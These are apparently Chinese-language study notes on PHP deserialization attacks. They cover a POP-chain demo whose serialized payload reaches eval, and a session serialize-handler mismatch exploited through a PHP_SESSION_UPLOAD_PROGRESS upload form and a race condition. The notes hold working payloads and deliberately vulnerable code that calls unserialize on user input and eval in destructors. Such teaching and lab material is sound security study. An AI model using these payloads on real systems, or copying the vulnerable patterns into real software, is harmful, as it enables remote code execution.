POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;



#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D


session序列化漏洞//8.php&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123;    public $mdzz;    function __construct()    &#123;        $this-&gt;mdzz = &#x27;phpinfo();&#x27;;    &#125;        function __destruct()    &#123;        eval($this-&gt;mdzz);		//看到触发点在这里    &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123;    $m = new OowoO();&#125;else&#123;    highlight_string(file_get_contents(&#x27;8.php&#x27;));&#125;?&gt;


构造payload
ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);		//session.upload_progress（上传进度写入 Session）永远使用 php.ini 的全局配置，所以这行可有可无(压根不起作用)，需要手动去设置session_start();class OowoO&#123;    public $mdzz = &#x27;print_r(scandir(dirname(__FILE__)));&#x27;;&#125;$obj = new OowoO();echo serialize($obj);

创建一个本地的html上传页面来给8.php上传文件
&lt;form action=&quot;8.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;

如果session.upload_progress.cleanup被开启，则可以使用竞争的方式去让他失效，如一下：
给他添加一个变量，然后一直跑这个变量，让他奔溃。


总结：
#如果session.upload_progress.cleanup开启可以使用竞争来让他奔溃#如果session.serialize_handler使用相同的序列化处理器，则无法进行
